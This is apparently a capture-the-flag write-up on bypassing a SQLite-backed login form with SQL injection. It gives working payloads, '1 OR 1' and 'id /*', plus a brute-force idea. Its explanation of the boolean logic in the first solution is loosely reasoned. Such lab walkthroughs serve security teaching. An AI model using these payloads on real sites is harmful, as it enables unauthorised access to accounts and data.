**Name**: Blacklist  
**Points**: 200  
**Instructions**: There is a website running at http://challenges.runesec.com:37953. Can you login? If not, try smarter not harder.  
**Hint**: Some hackers love the quote symbol. Some developers love the blacklist approach. What about you?  

## Exploration

- We're given the following login portal:
```
<div class="form-group">
   <label for="username">ID:</label>
   <input type="number" id="username" name="id" class="form-control">
</div>
<div class="form-group">
   <label for="password">Password:</label>
   <div class="controls">
      <input type="password" id="password" name="password" class="form-control">
   </div>
</div>
```

- From the hint of this challenge, we know we'll have to craft an SQL injection query to get through. We also know there's a blacklist that filters out some SQL semantics from the input.

- The first HTML input field (for username/id) has `type="number"` so it can only accept numeric values. Not really. We can edit the type to `type="text"` through our browser's dev tools and input whatever we want. 

- We could also send our requests outside of the browser, through `curl`, for example.

- Using `'` and `"` in the inputs makes the page throw some errors:  
```
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "\" in /problems/blacklist_6/webroot/login.php on line 20   
Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /problems/blacklist_6/webroot/login.php:22 Stack trace: #0 {main} thrown in /problems/blacklist_6/webroot/login.php on line 22
```

## Exploitation

Let's try guess the query that's invoked on the server to authorize us:
```
SELECT * FROM ??? WHERE ???={input} AND ???="{input}";
```
We have no idea what the table is named.  
We have some idea what the 2 columns might be called. `id` and `password` maybe? Let's go with that.

So our guess now is:
```
SELECT * FROM ??? WHERE id={input} AND password="{input}";
```

So, for us to get through, it all boils down to making the expression `id={input} AND password="{input}"` evaluate to true.

*Notice there are no quotes around the input for id. That's because it's expecting a numeric value. We can be confident about that since the UI is only allowing for numeric input.*

#### Solution 1
```
Username: 1 OR 1  
Password:  
```
Which results to the following crafted query on the server:
```
SELECT * FROM ??? WHERE id=1 OR 1 AND password="";
```

> SQLite does not have a separate Boolean storage class. Instead, Boolean values are stored as integers 0 (false) and 1 (true). (https://sqlite.org/datatype3.html)

The crafted query above works because `false OR true AND false` => `true`, since `anything OR true` evaluates to `true`, always.  

We're lucky `OR` is not blacklisted.

#### Solution 2
```
Username: id /*  
Password:  
```
Which results to the following crafted query on the server:
```
SELECT * FROM ??? WHERE id=id /* AND password="";
```

For this to work we have to correctly guess the column for the username/id field. `id=id` is always `true` since we compare something with itself. `/*` opens a multi-line comment which makes whatever comes after it irrelevant when the query is evaluated. Thus, the password doesn't matter.

#### More Solutions
There are plenty of crafted queries that can get us in, but we have a strong preference towards short and concise solutions.  

We could also (naively) write a script to brute force the id:
`id=0 /*`  
`id=1 /*`  
`id=-1 /*`  
`id=2 /*`  
`id=-2 /*`  
...  
`id=9000 /*`  
`id=-9000 /*`  
...  
...  
...  
*To infinity and beyond!*
